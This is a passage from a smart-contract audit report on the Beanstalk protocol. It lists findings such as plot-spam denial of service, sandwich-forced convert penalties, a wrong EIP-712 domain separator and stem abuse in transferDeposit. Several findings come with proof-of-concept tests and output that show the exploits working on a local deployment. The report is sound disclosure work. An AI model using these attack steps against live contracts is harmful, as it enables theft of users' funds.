I believe Invariable must prevent drain of funds and if it fails to do, it is High severity vulnerability regardless of the fact whether there is critical exploit or not.

Let me explain this logic where exists drain of funds by 2 examples:

1. Invariable works correctly. It makes issue with drain funds invalid - drain of funds just can't occur.
2. Invariable works incorrectly. It makes drain of funds Critical issue - and therefore issue in Invariable logic is by definition Critical issue.

## Tools Used

Manual Review

## Recommendations

Introduce storage variable tom track Bean amount deposited to Market on order creation. And add handle logic to Invariable to account it.

## <a id='M-12'></a>M-12. Attacker can spam Plots to victim to cause DOS on Plot transfer

_Submitted by [Joshuajee](https://profiles.cyfrin.io/u/undefined), [deadrosesxyz](https://profiles.cyfrin.io/u/undefined), [T1MOH](https://profiles.cyfrin.io/u/undefined). Selected submission by: [T1MOH](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary

To remove certain Plot index from account it loops through array `plotIndexes`:
<https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/df2dd129a878d16d4adc75049179ac0029d9a96b/protocol/contracts/libraries/LibDibbler.sol#L385-L419>

```solidity
    function removePlotIndexFromAccount(
        address account,
        uint256 fieldId,
        uint256 plotIndex
    ) internal {
        AppStorage storage s = LibAppStorage.diamondStorage();
@>      uint256 i = findPlotIndexForAccount(account, fieldId, plotIndex);
        Field storage field = s.accts[account].fields[fieldId];
        field.plotIndexes[i] = field.plotIndexes[field.plotIndexes.length - 1];
        field.plotIndexes.pop();
    }

    /**
     * @notice finds the index of a plot in an accounts plotIndex list.
     */
    function findPlotIndexForAccount(
        address account,
        uint256 fieldId,
        uint256 plotIndex
    ) internal view returns (uint256 i) {
        AppStorage storage s = LibAppStorage.diamondStorage();
        Field storage field = s.accts[account].fields[fieldId];
        uint256[] memory plotIndexes = field.plotIndexes;
        uint256 length = plotIndexes.length;
        while (plotIndexes[i] != plotIndex) {
            i++;
            if (i >= length) {
                revert("Id not found");
            }
        }
        return i;
    }
```

PlotIndex is removed in several sceanrios:

1. When User transfers his Plot, i.e. in `PodTransfer.removePlot()`
2. When User harvests that PlotIndex, i.e. in `FieldFacet._harvestPlot()`

Attacker can just spam victim by transferring 1 wei Plots. It will populate array `plotIndexes` too much. As a result that removal will revert with out-of-gas error.

## Impact

User can't transfer Plots because it tries to find and remove certain index. It will revert with out-of-gas error because Griefer transferred too many 1 wei plots previously.

Worth noting that Protocol will operate on L2 with cheap gas, so it's much easier now to perform attack from griefer's side.

At will of attacker he can poison anyone's account and block interaction with existing Plots.

## Tools Used

Manual Review

## Recommendations

Do not track array `plotIndexes` on-chain. Track events to get array of Plot indexes off-chain

Or you can refactor to use Enumerable set instead of array.

## <a id='M-13'></a>M-13. Orderers will lose their Beans after migration to L2

_Submitted by [T1MOH](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary

Current version of Beanstalk deployed on Mainnet has following logic of order creation in Market:

Order on Market means that order creator wants to buy Pod for Beans. During creation Market transfers Beans from orderer to Beanstalk. Problem is that those transferred Beans are not reflected on User's internal balance.

It means after migration these Beans won't be returned because it is not internal balance.

## Vulnerability Details

Here you can see that Market transfers Beans from user via function `LibTransfer.receiveToken()`:
<https://github.com/BeanstalkFarms/Beanstalk/pull/909/files#diff-38bfddf2eaaa5a2f714bcff17d7bef97c83eed773fb2a0e51c6e327eee98b839L113-L133>

As you can see these Beans are not reflected in internal balance:

```solidity
    function receiveToken(
        IERC20 token,
        uint256 amount,
        address sender,
        From mode
    ) internal returns (uint256 receivedAmount) {
        if (amount == 0) return 0;
        if (mode != From.EXTERNAL) {
            receivedAmount = LibBalance.decreaseInternalBalance(
                sender,
                token,
                amount,
                mode != From.INTERNAL
            );
            if (amount == receivedAmount || mode == From.INTERNAL_TOLERANT) return receivedAmount;
        }
        uint256 beforeBalance = token.balanceOf(address(this));
        token.safeTransferFrom(sender, address(this), amount - receivedAmount);
        return receivedAmount.add(token.balanceOf(address(this)).sub(beforeBalance));
    }
```

So it means Users will lose those Beans during migration because it won't be refunded via contract ReseedInternalBalances.sol

## Impact

Users who have open orders on Market during migration will lose their Beans submitted during order creation.

## Tools Used

Manual Review

## Recommendations

Migrate orderers' Beans submitted to Beanstalk.

## <a id='M-14'></a>M-14. Potential Loss of Fertilizer ERC1155 NFTs During L1 to L2 Migration.

_Submitted by [Uno](https://profiles.cyfrin.io/u/undefined), [T1MOH](https://profiles.cyfrin.io/u/undefined). Selected submission by: [Uno](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary

a potential vulnerability in the L1 to L2 migration process for contracts holding fertilizer ERC1155 NFTs.
The vulnerability arises from the possibility of NFT loss if the contract address on L1 is not owned by the same user on L2.

## Vulnerability Details

<https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/main/protocol/contracts/beanstalk/init/reseed/L2/ReseedBarn.sol#L88-L93>

During the migration process from L1 to L2, there is a critical step where the ownership of the contract addresses
must be maintained. If the contract address on L1, which holds the fertilizer ERC1155 NFTs, is not controlled by the same user on L2,
the NFTs could be lost. This is due to the mismatch in contract addresses, leading to a scenario where the migrated assets
are sent to an incorrect or non-existent address on L2.

```solidity
function mintFertilizers(Fertilizer fertilizerProxy, Fertilizers[] calldata fertilizerIds) internal {
    // ... snip
    for (uint j; j < f.accountData.length; j++) {
        // `id` only needs to be set once per account, but is set on each fertilizer
        // as `Fertilizer` does not have a function to set `id` once on a batch.
        fertilizerProxy.beanstalkMint(
@>>         f.accountData[j].account,
            fid,
            f.accountData[j].amount,
            f.accountData[j].lastBpf
        );
    }
}
```

If `f.accountData[j].account` is a contract address on L1 and the same address is not contract on L2 fertilizerId will be minted to wrong address.

## Impact

If the L1 contract address not owned by user on L2, the minted fertilizer NFTs will be deposited into wrong address on L2
which user cannot access. This essentially results in lost ERC1155 NFTs for the intended recipient.

## Tools Used

## Recommendations 

address on L2 must be owned by same account address on L1, if account is EAO same user will receive NFT but if it is contract a check michanism must be added devlopers knows better hwo this will be update.

## <a id='M-15'></a>M-15. Forcing penalty to users converting by applying sandwich attack

_Submitted by [holydevoti0n](https://profiles.cyfrin.io/u/undefined), [asefewwexa](https://profiles.cyfrin.io/u/undefined), [fyamf](https://profiles.cyfrin.io/u/undefined). Selected submission by: [fyamf](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary

An attacker can force a penalty to be applied to a user converting by employing a sandwich attack.

## Vulnerability Details

Suppose P > 1, and the deltaB in the BeanEth well is positive. Alice (an honest user) intends to convert bean to LP (in the direction of pegging), so no penalty is expected for Alice.

Bob (the attacker) performs a sandwich attack by first swapping WETH to bean in the well, causing the deltaB in the well to become zero (or even negative). When Alice's convert transaction is executed, she increases the bean reserve in the well, making her transaction appear to be in the direction of unpegging (since the deltaB was set to zero by Bob). As a result, a penalty is applied to Alice.

After Alice's transaction, Bob swaps bean back to WETH to restore the deltaB to its original state.

By executing this attack, Bob forces a penalty on Alice and gains financially by selling beans before Alice's transaction and buying beans after Alice's transaction.

```solidity
    function executePipelineConvert(
        address inputToken,
        address outputToken,
        uint256 fromAmount,
        uint256 fromBdv,
        uint256 initialGrownStalk,
        AdvancedFarmCall[] calldata advancedFarmCalls
    ) external returns (uint256 toAmount, uint256 newGrownStalk, uint256 newBdv) {
        PipelineConvertData memory pipeData = LibPipelineConvert.populatePipelineConvertData(
            inputToken,
            outputToken
        );

        // Store the capped overall deltaB, this limits the overall convert power for the block
        pipeData.overallConvertCapacity = LibConvert.abs(LibDeltaB.overallCappedDeltaB());

        IERC20(inputToken).transfer(C.PIPELINE, fromAmount);
        executeAdvancedFarmCalls(advancedFarmCalls);

        // user MUST leave final assets in pipeline, allowing us to verify that the farm has been called successfully.
        // this also let's us know how many assets to attempt to pull out of the final type
        toAmount = transferTokensFromPipeline(outputToken);

        // Calculate stalk penalty using start/finish deltaB of pools, and the capped deltaB is
        // passed in to setup max convert power.
        pipeData.stalkPenaltyBdv = prepareStalkPenaltyCalculation(
            inputToken,
            outputToken,
            pipeData.deltaB,
            pipeData.overallConvertCapacity,
            fromBdv,
            pipeData.initialLpSupply
        );

        // Update grownStalk amount with penalty applied
        newGrownStalk = (initialGrownStalk * (fromBdv - pipeData.stalkPenaltyBdv)) / fromBdv;

        newBdv = LibTokenSilo.beanDenominatedValue(outputToken, toAmount);
    }
```

<https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/main/protocol/contracts/libraries/Convert/LibPipelineConvert.sol#L62>

## Test Case

The foundry test demonstrates the sandwich attack scenario described. Initially, Alice deposits 1000e6 beans, and the state of the well is such that no penalty would be applied if Alice converts her beans to LP. However, before Alice performs the conversion, Bob manipulates the well’s state so that the deltaB becomes zero.

During Alice’s conversion, `console.log` in the `executePipelineConvert` function reveals that a penalty of `488088482` is applied to her, confirming the success of Bob's attack.

```solidity
    function executePipelineConvert(
        address inputToken,
        address outputToken,
        uint256 fromAmount,
        uint256 fromBdv,
        uint256 initialGrownStalk,
        AdvancedFarmCall[] calldata advancedFarmCalls
    ) external returns (uint256 toAmount, uint256 newGrownStalk, uint256 newBdv) {
        //...
        pipeData.stalkPenaltyBdv = prepareStalkPenaltyCalculation(
            inputToken,
            outputToken,
            pipeData.deltaB,
            pipeData.overallConvertCapacity,
            fromBdv,
            pipeData.initialLpSupply
        );

        // logging the penalty applied
        console.log("stalkPenaltyBdv: ", pipeData.stalkPenaltyBdv);

        //....
    }
```

<https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/main/protocol/contracts/libraries/Convert/LibPipelineConvert.sol#L62>

```solidity
    function testConvertBeanToLPSandwich() public {
        int96 stem;

        uint256 amount = 1000e6;

        // the state of the well is such that converting bean to LP does not apply any penalty to Alice
        setDeltaBforWell(int256(amount), beanEthWell, C.WETH);

        depositBeanAndPassGermination(amount, users[1]);

        // sandwich attack
        // make the deltaB equal to zero before Alices's convert
        setDeltaBforWell(0, beanEthWell, C.WETH);

        // do the convert

        // Create arrays for stem and amount
        int96[] memory stems = new int96[](1);
        stems[0] = stem;

        AdvancedFarmCall[] memory beanToLPFarmCalls = createBeanToLPFarmCalls(
            amount,
            new AdvancedPipeCall[](0)
        );

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = amount;

        vm.resumeGasMetering();
        vm.prank(users[1]); // do this as user 1
        convert.pipelineConvert(
            C.BEAN, // input token
            stems, // stems
            amounts, // amount
            beanEthWell, // token out
            beanToLPFarmCalls // farmData
        );

        // sandwich attack
        // make the deltaB equal to zero after the Alices's convert
        setDeltaBforWell(0, beanEthWell, C.WETH);
    }
```

```solidity
    function createBeanToLPFarmCalls(
        uint256 amountOfBean,
        AdvancedPipeCall[] memory extraPipeCalls
    ) internal view returns (AdvancedFarmCall[] memory output) {
        // first setup the pipeline calls

        // setup approve max call
        bytes memory approveEncoded = abi.encodeWithSelector(
            IERC20.approve.selector,
            beanEthWell,
            MAX_UINT256
        );

        uint256[] memory tokenAmountsIn = new uint256[](2);
        tokenAmountsIn[0] = amountOfBean;
        tokenAmountsIn[1] = 0;

        // encode Add liqudity.
        bytes memory addLiquidityEncoded = abi.encodeWithSelector(
            IWell.addLiquidity.selector,
            tokenAmountsIn, // tokenAmountsIn
            0, // min out
            C.PIPELINE, // recipient
            type(uint256).max // deadline
        );

        // Fabricate advancePipes:
        AdvancedPipeCall[] memory advancedPipeCalls = new AdvancedPipeCall[](100);

        uint256 callCounter = 0;

        // Action 0: approve the Bean-Eth well to spend pipeline's bean.
        advancedPipeCalls[callCounter++] = AdvancedPipeCall(
            C.BEAN, // target
            approveEncoded, // calldata
            abi.encode(0) // clipboard
        );

        // Action 2: Add One sided Liquidity into the well.
        advancedPipeCalls[callCounter++] = AdvancedPipeCall(
            beanEthWell, // target
            addLiquidityEncoded, // calldata
            abi.encode(0) // clipboard
        );

        // append any extra pipe calls
        for (uint j; j < extraPipeCalls.length; j++) {
            advancedPipeCalls[callCounter++] = extraPipeCalls[j];
        }

        assembly {
            mstore(advancedPipeCalls, callCounter)
        }

        // Encode into a AdvancedFarmCall. NOTE: advancedFarmCall != advancedPipeCall.
        // AdvancedFarmCall calls any function on the beanstalk diamond.
        // advancedPipe is one of the functions that its calling.
        // AdvancedFarmCall cannot call approve/addLiquidity, but can call AdvancedPipe.
        // AdvancedPipe can call any arbitrary function.
        AdvancedFarmCall[] memory advancedFarmCalls = new AdvancedFarmCall[](1);

        bytes memory advancedPipeCalldata = abi.encodeWithSelector(
            depot.advancedPipe.selector,
            advancedPipeCalls,
            0
        );

        advancedFarmCalls[0] = AdvancedFarmCall(advancedPipeCalldata, new bytes(0));
        return advancedFarmCalls;
    }
```

The output is:

```Solidity
  stalkPenaltyBdv:  488088482
```

## Impact

Forcing users to pay penalty by sandwiching their convert transaction.

## Tools Used

## Recommendations

It is recommended that users be allowed to set the maximum penalty they are willing to tolerate when converting.

```solidity
    function pipelineConvert(
        address inputToken,
        int96[] calldata stems,
        uint256[] calldata amounts,
        address outputToken,
        AdvancedFarmCall[] calldata advancedFarmCalls,
        uint256 maximumTolerablePenalty
    )
        external
        payable
        fundsSafu
        nonReentrant
        returns (int96 toStem, uint256 fromAmount, uint256 toAmount, uint256 fromBdv, uint256 toBdv)
    {
        //....

        uint256 penalty;

        (toAmount, grownStalk, toBdv, penalty) = LibPipelineConvert.executePipelineConvert(
            inputToken,
            outputToken,
            fromAmount,
            fromBdv,
            grownStalk,
            advancedFarmCalls
        );

        require(penalty <= maximumTolerablePenalty, "penalty is more that tolerable amount");

        //.....
    }
```

## <a id='M-16'></a>M-16. Improper Domain Separator Hash in _domainSeparatorV4() Function

_Submitted by [MattJenkins](https://profiles.cyfrin.io/u/undefined), [galturok](https://profiles.cyfrin.io/u/undefined), [inh3l](https://profiles.cyfrin.io/u/undefined), [Draiakoo](https://profiles.cyfrin.io/u/undefined), [asefewwexa](https://profiles.cyfrin.io/u/undefined), [bladesec](https://profiles.cyfrin.io/u/undefined), [0xsandy](https://profiles.cyfrin.io/u/undefined). Selected submission by: [galturok](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary

The `_domainSeparatorV4()` function in the `LibTractor` library uses an incorrect type hash which does not match the format of data it is supposed to represent. In EIP-712, the domain separator should match the format: `EIP712Domain(string name, string version, uint256 chainId, address verifyingContract)`. However, the function is currently using `BLUEPRINT_TYPE_HASH` intended for a different data structure: `Blueprint(address publisher, bytes data, bytes operatorData, uint256 maxNonce, uint256 startTime, uint256 endTime)`. This mismatch leads to incorrect domain separation, causing blueprint-based signature verification to fail.

## Vulnerability Details

The EIP-712 standard specifies a domain separator format using the type hash for the following data structure:

```Solidity
EIP712 Domain (string name, string version, uint256 chainId, address verifyingContract)
```

However, in the current implementation:

```solidity

    function _domainSeparatorV4() internal view returns (bytes32) {
    return
        keccak256(
            abi.encode(
     @>         BLUEPRINT_TYPE_HASH,
                TRACTOR_HASHED_NAME,
                TRACTOR_HASHED_VERSION,
                C.getChainId(),
                address(this)
            )
        );
}


```

The function incorrectly uses BLUEPRINT\_TYPE\_HASH instead of EIP712\_TYPE\_HASH. BLUEPRINT\_TYPE\_HASH is meant for:

```Solidity
Blueprint(address publisher, bytes data, bytes operatorData, uint256 maxNonce, uint256 startTime, uint256 endTime);
```

This mismatch results in an incorrect domain separator.

# Impact

1. **Signature Verification Failure**: Because the type hash used in the domain separator does not match the required format, any off-chain signatures generated expect the domain to be compliant with `EIP712Domain` will not match the calculated on-chain domain separator. As a result, all such signature verifications will fail.

## POC

To demonstrate and prove the issue with the incorrect domain separator, we'll use Foundry for testing. The objective is to show that using the incorrect type hash results in domain separators that do not match the expected hash needed for EIP-712 compliant signature verification. We will compare the incorrect domain separator with the corrected one and validate the findings.

### Foundry Test

```Solidity

// SPDX-License-Identifier: MIT
pragma solidity >=0.6.0 <0.9.0;

import "forge-std/Test.sol";
import "../../../contracts/libraries/LibTractor.sol";


// Mock contract to mimic the necessary external dependencies
contract MockC {
    function getChainId() public view returns (uint256) {
        return block.chainid;
    }
}

contract TestDomainSeparator is Test {
    MockC mockC;
    address verifyingContract;
    
    // Define the constants manually since we can't access them directly
    bytes32 private constant EIP712_TYPE_HASH = keccak256(
        "EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"
    );
    bytes32 private constant TRACTOR_HASHED_NAME = keccak256(bytes("Tractor"));
    bytes32 private constant TRACTOR_HASHED_VERSION = keccak256(bytes("1"));
    bytes32 private constant BLUEPRINT_TYPE_HASH = keccak256(
        "Blueprint(address publisher,bytes data,bytes operatorData,uint256 maxNonce,uint256 startTime,uint256 endTime)"
    );

    function setUp() public {
        mockC = new MockC();
        verifyingContract = address(this);
    }

    // Correct domain separator using EIP712_TYPE_HASH
    function correctDomainSeparator() internal view returns (bytes32) {
        return keccak256(
            abi.encode(
                EIP712_TYPE_HASH,
                TRACTOR_HASHED_NAME,
                TRACTOR_HASHED_VERSION,
                mockC.getChainId(),
                verifyingContract
            )
        );
    }

    function testIncorrectDomainSeparator() public {
        // Calculate the supposed domain separator using the incorrect BLUEPRINT_TYPE_HASH
        bytes32 incorrectSeparator = keccak256(
            abi.encode(
                BLUEPRINT_TYPE_HASH,
                TRACTOR_HASHED_NAME,
                TRACTOR_HASHED_VERSION,
                mockC.getChainId(),
                verifyingContract
            )
        );

        // Ensure the wrong type hash does not produce the expected domain separator
        bytes32 expectedCorrectSeparator = correctDomainSeparator();
        assertFalse(incorrectSeparator == expectedCorrectSeparator, "Incorrect type hash should not match expected correct domain separator");

        // Calculate the correct domain separator using EIP712_TYPE_HASH
        bytes32 calculatedCorrectSeparator = keccak256(
            abi.encode(
                EIP712_TYPE_HASH,
                TRACTOR_HASHED_NAME,
                TRACTOR_HASHED_VERSION,
                mockC.getChainId(),
                verifyingContract
            )
        );

        // Ensure the correct domain separator matches the expected one
        assertEq(calculatedCorrectSeparator, expectedCorrectSeparator, "Correct domain separator did not match expected value");
    }
}
```

### Explanation

1. **SetUp**: We create a mock contract `MockC` to mimic getting the chain ID and set up the test environment by fetching the contract address.
2. **Correct Domain Separator**: A helper function `correctDomainSeparator` is defined to calculate the correct domain separator using `EIP712_TYPE_HASH`.
3. **Test Function**:

   * `testIncorrectDomainSeparator` calculates the supposed domain separator using the incorrect `BLUEPRINT_TYPE_HASH` and verifies that it does not match the correct domain separator.
   * The function then calculates the correct domain separator using `EIP712_TYPE_HASH` and verifies that it matches the expected correct separator.

This Foundry test clearly demonstrates the issue and the impact of using the incorrect type hash in `_domainSeparatorV4()`, validating the need for the recommended correction.

## Tools Used

* Manual Code Review
* Foundry for testing and validation.

## Recommendations

To resolve this issue, update the `_domainSeparatorV4()` function to use `EIP712_TYPE_HASH` when encoding the domain separator:

```diff

function _domainSeparatorV4() internal view returns (bytes32) {
    return
        keccak256(
            abi.encode(
-               BLUEPRINT_TYPE_HASH,
+               EIP712_TYPE_HASH,
                TRACTOR_HASHED_NAME,
                TRACTOR_HASHED_VERSION,
                C.getChainId(),
                address(this)
            )
        );
}
```

## <a id='M-17'></a>M-17. Some users would be stuck on the L1 and not be able to migrate their Beans to the L2

_Submitted by [Bauchibred](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/8c8710df547f7d7c5dd82c5381eb6b34532e4484/protocol/contracts/beanstalk/silo/L2ContractMigrationFacet.sol#L88-L114


## Summary

As explained in the[ L2 migration video walkthrough provided by Beanstalk](https://discord.com/channels/1127263608246636635/1240187918878904382/1247306897741058121), in-order to curb the issue where not the same user controls their account on different chains so as to ensure no attacker front runs the migration by creating (a matching account on the L2 to steal the users migrated beans, Beanstalk now requires that users [first sign](https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/8c8710df547f7d7c5dd82c5381eb6b34532e4484/protocol/contracts/beanstalk/silo/L2ContractMigrationFacet.sol#L104) their transactions with the wanted receiver before allowing a contract that owns deposits and bean-asset internal balances to redeem onto an address on L2.

Issue is that, Beanstalk uses EIP 712 to make and verify these signatures, which would not work completely for the intended use, considering Beanstalk expects contracts to make these signatures (not just EOAs), but EIP712 does not work well with smart contracts or wallets and as such only EOAs integrating with Beanstalk are ensured to be able to migrate, where as other (non-EOA) users are not.

## Vulnerability Details

Take a look at https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/8c8710df547f7d7c5dd82c5381eb6b34532e4484/protocol/contracts/beanstalk/silo/L2ContractMigrationFacet.sol#L88-L114

```solidity
    function redeemDepositsAndInternalBalances(
        address owner,
        address reciever,
        AccountDepositData[] calldata deposits,
        AccountInternalBalance[] calldata internalBalances,
        uint256 ownerRoots,
        bytes32[] calldata proof,
        uint256 deadline,
        bytes calldata signature
    ) external payable fundsSafu noSupplyChange nonReentrant {
        // verify deposits are valid.
        // note: if the number of contracts that own deposits is small,
        // deposits can be stored in bytecode rather than relying on a merkle tree.
        verifyDepositsAndInternalBalances(owner, deposits, internalBalances, ownerRoots, proof);

        // signature verification.
        verifySignature(owner, reciever, deadline, signature);

        // set deposits for `reciever`.
        uint256 accountStalk;
        for (uint256 i; i < deposits.length; i++) {
            accountStalk += addMigratedDepositsToAccount(reciever, deposits[i]);
        }

        // set stalk for account.
        setStalk(reciever, accountStalk, ownerRoots);
    }
```

This function is called when a contract that owns bean-asset internal balances is to redeem onto an address on L2, now it queries `verifySignature()` that's implemented this way: https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/8c8710df547f7d7c5dd82c5381eb6b34532e4484/protocol/contracts/beanstalk/silo/L2ContractMigrationFacet.sol#L136-L151

```solidity
    function verifySignature(
        address owner,
        address reciever,
        uint256 deadline,
        bytes calldata signature
    ) internal view {
        require(block.timestamp <= deadline, "Migration: permit expired deadline");
        bytes32 structHash = keccak256(
            abi.encode(REDEEM_DEPOSIT_TYPE_HASH, owner, reciever, deadline)
        );

        bytes32 hash = _hashTypedDataV4(structHash);
        address signer = ECDSA.recover(hash, signature);
        require(signer == owner, "Migration: permit invalid signature");
    }

```

Note that these signatures are [expected to be verified for hashed data](https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/8c8710df547f7d7c5dd82c5381eb6b34532e4484/protocol/contracts/beanstalk/silo/L2ContractMigrationFacet.sol#L214) using EIP712, i.e https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/8c8710df547f7d7c5dd82c5381eb6b34532e4484/protocol/contracts/beanstalk/silo/L2ContractMigrationFacet.sol#L223-L226

```solidity
    function _hashTypedDataV4(bytes32 structHash) internal view returns (bytes32) {
        return keccak256(abi.encodePacked("\x19\x01", _domainSeparatorV4(), structHash));
    }

```

Problem However is that some users would not be able to access this functionality as valid signatures from them wouldn't work since they can't work with EIP 712.

According to [EIP1271: Standard Signature Validation Method for Contracts](https://eips.ethereum.org/EIPS/eip-1271):

> Externally Owned Accounts (EOA) can sign messages with their associated private keys, but currently contracts cannot. We propose a standard way for any contracts to verify whether a signature on a behalf of a given contract is valid. This is possible via the implementation of a `isValidSignature(hash, signature)` function on the signing contract, which can be called to validate a signature.

So while recovering a valid message signed by these set of users , the return value will be the `bytes4(0)` for any vote signed by a contract (e.g. Multisig) because contracts that sign messages sticking to the EIP1271 standard use the `EIP1271_MAGIC_VALUE` as the successful return for a properly recovered signature. A sample of this is shown within the [EIP1271](https://eips.ethereum.org/EIPS/eip-1271) and also within [CompatibilityFallbackHandler by GnosisSafe](https://github.com/safe-global/safe-smart-account/blob/c36bcab46578a442862d043e12a83fec41143dec/contracts/handler/CompatibilityFallbackHandler.sol#L66).

As a result of this scenario, these set of users would not be able to migrate their Beans even though they produced valid signatures.

## Impact

Some users would have their Beans stuck on the L1 even if they want to migrate to the L2 due to the current signature used with the migration logic.

## Tools Used

Manual review

## Recommendations

Consider adding contract signature support by implementing a recovery via the suggested `isValidSignature() `function of the `EIP1271` and comparing the recovered value against the `MAGIC_VALUE`.

## <a id='M-18'></a>M-18. In `transferDeposit` the recipient is able to change the stem to a value to take higher grown stalks from the sender

_Submitted by [fyamf](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary

When granting an allowance to a user, only the token amount is specified, not the `stem`. However, during a `transferDeposit` operation, the recipient has the option to include the `stem`. This allows the recipient to access the sender's grown stalks linked to older deposits (with a lower stem), leading to the transfer of a greater quantity of grown stalks to the recipient.

## Vulnerability Details

* Suppose Alice has deposited `1000e6` beans in season 1.
* In season 1001 (after 1000 hours), Alice deposits another `500e6` beans.
* In this season, Alice gives an allowance of `500e6` to Bob.
* Bob notices that Alice had a deposit in season 1, so the amount of grown stalks associated with that deposit is much higher than the grown stalks associated with the deposit in season 1001.
* Bob calls `transferDeposit` with the following parameters:
  * `sender`: Alice
  * `recipient`: Bob
  * `token`: BEAN
  * `stem`: stem at season 1 instead of 1001
  * `amount`: 500e6

As a result, a deposit of `500e6` beans will be transferred to Bob. Additionally, all the grown stalks associated with the `500e6` deposit from season 1 will also be transferred to Bob.

While, if Bob used the `stem` from season 1001 as the `stem` parameter in the `transferDeposit` function, no grown stalks would be allocated to him, since no stalks have yet grown from Alice's second deposit.

```Solidity
    function transferDeposit(
        address sender,
        address recipient,
        address token,
        int96 stem,
        uint256 amount
    ) public payable fundsSafu noNetFlow noSupplyChange nonReentrant returns (uint256 _bdv) {
        if (sender != LibTractor._user()) {
            LibSiloPermit._spendDepositAllowance(sender, LibTractor._user(), token, amount);
        }
        LibSilo._mow(sender, token);
        // Need to update the recipient's Silo as well.
        LibSilo._mow(recipient, token);
        _bdv = _transferDeposit(sender, recipient, token, stem, amount);
    }
```

<https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/main/protocol/contracts/beanstalk/silo/SiloFacet/SiloFacet.sol#L134>

### Test Case

The following test implements the scenario explained above. It shows that the grown stalks allocated to Bob is `6000000000000` which is decreased from Alice's.

```javascript
const { expect } = require("chai");
const { deploy } = require("../scripts/deploy.js");
const { getAllBeanstalkContracts } = require("../utils/contracts.js");
const { EXTERNAL } = require("./utils/balances.js");
const { to18, to6, toStalk, toBN } = require("./utils/helpers.js");
const { BEAN, ZERO_ADDRESS } = require("./utils/constants.js");
const { takeSnapshot, revertToSnapshot } = require("./utils/snapshot.js");
const { initalizeUsersForToken, endGermination } = require("./utils/testHelpers.js");
const axios = require("axios");
const fs = require("fs");
const { impersonateBeanWstethWell } = require("../utils/well.js");

let user, user2, owner;

describe("newSilo", function () {
  before(async function () {
    [owner, user, user2, user3, user4] = await ethers.getSigners();
    const contracts = await deploy((verbose = false), (mock = true), (reset = true));

    // `beanstalk` contains all functions that the regualar beanstalk has.
    // `mockBeanstalk` has functions that are only available in the mockFacets.
    [beanstalk, mockBeanstalk] = await getAllBeanstalkContracts(contracts.beanstalkDiamond.address);

    // initalize users - mint bean and approve beanstalk to use all beans.
    await initalizeUsersForToken(BEAN, [user, user2, user3, user4], to6("10000"));

  });

  beforeEach(async function () {
    snapshotId = await takeSnapshot();
  });

  afterEach(async function () {
    await revertToSnapshot(snapshotId);
  });


  describe("Transfer From", function () {
    it("transfer from with high grown stalks", async function () {
      // user is Alice
      // user2 is Bob
      console.log("Alice's first deposit in season: ", await beanstalk.season());

      const AliceFirstDepositedAmount = to6("1000");
      const AliceSecondDepositedAmount = to6("500");

      // Alice's first deposit
      const return1 = await beanstalk.connect(user).callStatic.deposit(BEAN, AliceFirstDepositedAmount, EXTERNAL);
      const AliceFirstDepositStem = return1[2];
      await beanstalk.connect(user).deposit(BEAN, AliceFirstDepositedAmount, EXTERNAL);

      // 1000 seasons are elapsed
      for (let i = 0; i < 1000; i++) {
        await mockBeanstalk.siloSunrise(to6("0"));
      }

      console.log("Alice's second deposit in season: ", await beanstalk.season());

      // Alice's second deposit
      const return2 = await beanstalk.connect(user).callStatic.deposit(BEAN, AliceSecondDepositedAmount, EXTERNAL);
      const AliceSecondDepositStem = return2[2];
      await beanstalk.connect(user).deposit(BEAN, AliceSecondDepositedAmount, EXTERNAL);

      console.log("Alice's balanceOfStalk before Bob uses the allowance: ", await beanstalk.balanceOfStalk(user.address));

      // Alice gives and allowance to Bob
      await beanstalk.connect(user).approveDeposit(user2.address, BEAN, AliceSecondDepositedAmount);

      // Bob transfers deposit from Alice to himself related to the Alice's first deposit instead of the Alice's second deposit
      await beanstalk.connect(user2).transferDeposit(user.address, user2.address, BEAN, AliceFirstDepositStem, AliceSecondDepositedAmount);

      console.log("Alice's balanceOfStalk after Bob uses the allowance: ", await beanstalk.balanceOfStalk(user.address));
      console.log("Bob's balanceOfStalk after using the allowance: ", await beanstalk.balanceOfStalk(user2.address));

    });


  });


});

```

The output is:

```Solidity
Alice's first deposit in season:  1
Alice's second deposit in season:  1001
Alice's balanceOfStalk before Bob uses the allowance:  BigNumber { value: "12000000000000" }
Alice's balanceOfStalk after Bob uses the allowance:  BigNumber { value: "6000000000000" }
Bob's balanceOfStalk after using the allowance:  BigNumber { value: "6000000000000" }
```

## Impact

The recipient of a `transferDeposit` can take the large amount of grown stalks from the sender that is not expected by the sender.

## Tools Used

## Recommendations

It is recommended that when `transferDeposit` is called to transfer from the sender to the recipient, the function should automatically review all of the sender's deposits and select the most recent ones that have a sufficient amount (greater than or equal to the transferring amount). This way, the deposit with the fewest associated grown stalks will be used for the deduction, resulting in fewer grown stalks being transferred from the sender to the recipient.

## <a id='M-19'></a>M-19. Transferring a deposit fully in a rainy season loses the rewards during the flood

_Submitted by [fyamf](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary

Assume Bob has nonzero roots, indicating he has already deposited and mowed. Then, in the following season, it rains. Because Bob had nonzero roots before the rainy season, he now has nonzero rain roots.

If Bob transfers all his deposits to Alice during this rainy season and there is a flood in the next season, neither Bob nor Alice will receive any SoP rewards related to the flood in the next season.

## Vulnerability Details

When transferring a deposit, first the function `_mow` is called for both sender and receiver.

```solidity
    function transferDeposit(
        address sender,
        address recipient,
        address token,
        int96 stem,
        uint256 amount
